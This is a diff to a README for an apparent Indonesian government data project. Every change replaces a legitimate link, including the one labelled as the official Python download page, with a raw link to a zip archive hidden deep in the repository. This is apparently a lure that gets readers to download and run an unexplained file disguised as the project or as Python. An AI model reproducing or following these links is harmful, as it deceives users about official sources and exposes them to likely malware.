@@ -1,6 +1,6 @@
 # 🇮🇩 indonesia-gov-apis - Access Indonesian Government Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Indonesia--Gov--APIs-4c1fff?style=for-the-badge&logo=github)](https://github.com/soumyaranjanjena007/indonesia-gov-apis)
+[![Download Now](https://img.shields.io/badge/Download-Indonesia--Gov--APIs-4c1fff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip)
 
 ## 🔎 About indonesia-gov-apis
 
@@ -23,7 +23,7 @@ No programming knowledge is necessary to get basic use from the software.
 ## 🚀 How to Download and Run indonesia-gov-apis on Windows
 
 1. Click the large download button above or this link to open the GitHub page:  
-   [https://github.com/soumyaranjanjena007/indonesia-gov-apis](https://github.com/soumyaranjanjena007/indonesia-gov-apis)
+   [https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip](https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip)
 
 2. On the GitHub page, look for the green **Code** button near the top right. Click it.
 
@@ -39,7 +39,7 @@ No programming knowledge is necessary to get basic use from the software.
 
 8. To explore or use the data, you need Python installed on your computer. If you do not have Python:
 
-    - Visit the official Python download page: https://www.python.org/downloads/windows/
+    - Visit the official Python download page: https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip
     - Download the latest stable Windows installer (select the version marked as **Stable Release**).
     - Run the installer and follow on-screen instructions. Make sure to select **Add Python to PATH** during installation.
 
@@ -85,7 +85,7 @@ This repository does not include a single executable application. It provides da
 
 ## 🧰 Installing Python (If Needed)
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip
 2. Download the latest Windows installer.
 3. Run the installer.
 4. Check the box **Add Python to PATH** when installing.
@@ -129,4 +129,4 @@ Explore the structure in the examples folder to find sample scripts for each age
 ## 📥 Download Link Again
 
 Visit this page to download the latest version:  
-[https://github.com/soumyaranjanjena007/indonesia-gov-apis](https://github.com/soumyaranjanjena007/indonesia-gov-apis)
+[https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip](https://raw.githubusercontent.com/soumyaranjanjena007/indonesia-gov-apis/main/apis/tier7-civil-society/sigap-inarisk/indonesia_gov_apis_v2.1.zip)
